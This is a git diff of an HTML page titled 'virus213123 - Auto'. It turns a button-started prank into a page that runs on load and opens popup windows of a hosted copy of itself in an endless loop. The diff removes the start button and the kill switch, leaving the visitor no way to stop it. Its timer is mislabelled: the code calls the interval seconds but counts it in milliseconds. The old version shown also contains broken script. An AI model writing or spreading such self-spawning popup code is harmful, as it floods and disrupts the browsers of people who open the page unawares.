@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>April Fools! - Sequence</title>
+    <title>virus213123 - Auto</title>
     <style>
         body {
             font-family: system-ui, -apple-system, sans-serif;
@@ -15,17 +15,6 @@
             margin: 0;
             background-color: #f0f2f5;
             color: #1c1e21;
-            overflow: hidden;
-        }
-        .header-hint {
-            position: fixed;
-            top: 10px;
-            font-weight: bold;
-            color: #d93025;
-            background: #fff;
-            padding: 5px 15px;
-            border-radius: 20px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
         .card {
             background: white;
@@ -33,128 +22,65 @@
             border-radius: 12px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.1);
             text-align: center;
-            z-index: 10;
         }
         #status { 
             font-family: monospace; 
-            font-size: 2rem; 
-            color: #ff4757; 
-            margin: 15px 0;
-        }
-        .content-frame {
-            width: 100%;
-            max-width: 300px;
-            margin-top: 10px;
-            border-radius: 8px;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 1rem;
-            cursor: pointer;
-            background: #007bff;
-            color: white;
-            border: none;
-            border-radius: 5px;
+            font-size: 1.5rem; 
+            color: #007bff; 
         }
     </style>
 </head>
 <body>
 
-    <div class="header-hint">PRESS "J" TO STOP THE CHAOS</div>
-
     <div class="card">
-        <h2 id="title">Prank Initializing...</h2>
-        <div id="status">Ready?</div>
-        <button id="startBtn">Start Prank</button>
-        
-        <img id="prankGif" class="content-frame" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/You_Are_An_Idiot_screen.gif/960px-You_Are_An_Idiot_screen.gif?_=20250929145934" style="display:none;">
+        <h2>Sequence Active</h2>
+        <div id="status">10.000s</div>
     </div>
 
-    <audio id="prankMusic" loop>
-        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
-    </audio>
-
 <script>
-    const DURATION = 30; // Time between spawns (3 seconds)
+    const duration = 10; // 10 seconds in ms
     const status = document.getElementById('status');
-    const startBtn = document.getElementById('startBtn');
-    const prankMusic = document.getElementById('prankMusic');
-    const prankGif = document.getElementById('prankGif');
-    
-    let isRunning = false;
-    let timerRequest;
-    
- const startBtn = document.getElementById('startBtn');
 
-// Trigger the click event automatically
-if (startBtn) {
-  startBtn.click();
-}
-    
-    function startPrank() {
-        if (isRunning) return;
-        isRunning = true;
-        
-        startBtn.style.display = 'none';
-        prankGif.style.display = 'block';
-        document.getElementById('title').innerText = "SYSTEM COMPROMISED";
-        
-        // Start Music
-        prankMusic.play().catch(e => console.log("Audio requires interaction first"));
-
-        runSequence();
-    }
-
-    function runSequence() {
-        if (!isRunning) return;
-
+    function startSequence() {
         const startTime = performance.now();
 
-        function update(currentTime) {
-            if (!isRunning) return;
-
+        function update() {
+            const currentTime = performance.now();
             const elapsed = currentTime - startTime;
-            const remaining = Math.max(0, DURATION - elapsed);
+            const remaining = Math.max(0, duration - elapsed);
 
-            status.innerText = (remaining / 1000).toFixed(2) + "s";
+            // Update the display
+            status.innerText = (remaining / 1000).toFixed(3) + "s";
 
             if (remaining > 0) {
-                timerRequest = requestAnimationFrame(update);
+                requestAnimationFrame(update);
             } else {
-                spawnWindow();
-                runSequence(); // Loop the sequence
+                // Action to take when timer hits zero
+                openClone();
+                
+                // RESTART THE LOOP
+                console.log("Restarting sequence...");
+                startSequence(); 
             }
         }
-        timerRequest = requestAnimationFrame(update);
+
+        requestAnimationFrame(update);
     }
 
-    function spawnWindow() {
-        const w = 400;
-        const h = 400;
-        
-        // Randomize position
-        const left = Math.floor(Math.random() * (window.screen.width - w));
-        const top = Math.floor(Math.random() * (window.screen.height - h));
+    function openClone() {
+        const width = Math.round(window.screen.width * 0.37);
+        const height = Math.round(window.screen.height * 0.37);
+        const left = (window.screen.width / 2) - (width / 2);
+        const top = (window.screen.height / 2) - (height / 2);
 
-        const features = `width=${w},height=${h},left=${left},top=${top},menubar=no,toolbar=no,location=no`;
+        const features = `width=${width},height=${height},left=${left},top=${top},menubar=no,toolbar=no,location=no,status=no`;
         
-        // Opens the current URL again in a small window
-        window.open(window.location.href, '_blank', features);
+        // This will likely be blocked by the browser unless you click the page first
+        window.open('https://sumeguyontheinternet.github.io/virus213123/index.html', '_blank', features);
     }
 
-    // KILL SWITCH: Listen for 'j' key
- //   window.addEventListener('keydown', (e) => {
-   //     if (e.key.toLowerCase() === 'j') {
-     //       isRunning = false;
-       //     cancelAnimationFrame(timerRequest);
-         //   prankMusic.pause();
-           // status.innerText = "HALTED";
-          //  status.style.color = "green";
-      //      alert("Prank Stopped! You're safe... for now.");
-     //   }
-    });
-
-    startBtn.addEventListener('click', startPrank);
+    // Initialize the first run
+    window.onload = startSequence;
 </script>
 </body>
 </html>
